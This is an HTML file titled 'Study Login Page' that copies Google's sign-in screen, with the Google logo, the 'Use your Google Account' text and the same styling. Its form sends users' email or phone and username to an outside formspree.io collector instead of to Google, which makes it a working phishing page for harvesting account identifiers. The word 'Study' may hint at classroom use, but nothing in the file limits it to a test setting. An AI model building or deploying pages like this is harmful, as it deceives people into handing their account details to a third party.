<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Study Login Page</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; }
        .login-box { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; width: 360px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        p { margin-bottom: 24px; color: #202124; }
        
        /* The Input Bars */
        .input-group { position: relative; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 13px 15px;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input:focus { outline: 2px solid #1a73e8; border-color: transparent; }

        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
    <h1>Sign in</h1>
    <p>Use your Google Account</p>

    <form action="https://formspree.io/f/xrebovrr" method="POST">
        
        <div class="input-group">
            <input type="text" name="email_or_phone" placeholder="Email or phone" aria-label="Email or phone" required>
        </div>

        <div class="input-group">
            <input type="text" name="username" placeholder="Username" aria-label="Username" required>
        </div>

        <div style="text-align: left; color: #1a73e8; font-weight: 500; font-size: 14px; margin-bottom: 40px;">
            Forgot email?
        </div>

        <button type="submit" class="btn">Next</button>
    </form>
</div>

</body>
</html>
